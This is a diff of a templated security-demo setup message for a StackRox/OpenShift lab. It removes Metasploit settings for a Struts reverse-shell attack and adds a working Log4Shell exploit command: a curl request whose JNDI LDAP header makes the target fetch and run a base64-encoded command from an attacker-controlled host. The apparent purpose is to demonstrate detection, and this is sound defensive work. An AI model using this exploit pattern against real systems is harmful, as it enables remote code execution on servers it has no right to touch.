@@ -18,17 +18,6 @@
             ssh ec2-user@{{ ec2_instance.instances.0.public_dns_name }}
 
           #######################
-          # Metasploit variables
-          #######################
-
-          set RHOST http://{{ struts_route.stdout }}
-          set RPORT 80
-          set LHOST {{ ec2_instance.instances.0.public_ip_address }}
-          set PAYLOAD linux/x64/shell/reverse_tcp
-          set LPORT 5432
-          set TARGETURI /showcase
-
-          #######################
           # Stackrox API Token
           #######################
 
@@ -38,4 +27,8 @@
 
           To verify success, run the following:
 
-          roxctl --insecure-skip-tls-verify=true -e "{{ stackrox_route.stdout }}:443" image scan --image=gcr.io/rox-se/struts-violations/visa-processor:latest-v2
+          roxctl --insecure-skip-tls-verify=true -e "{{ stackrox_route.stdout }}:443" image scan --image=quay.io/smileyfritz/log4shell-app:latest
+
+          To exploit the app running on OpenShift that is vulnerable to Log4Shell, run the following:
+
+          curl http://{{ log4shell_route.stdout }} -H 'X-Api-Version: ${jndi:ldap://{{ ec2_instance.instances.0.public_ip_address}}:1389/Basic/Command/Base64/ZWNobyAkKGRhdGUgJyslWS8lbS8lZCAlSDolTTolUycpID4gL3RtcC9leHBsb2l0ZWQ=}'
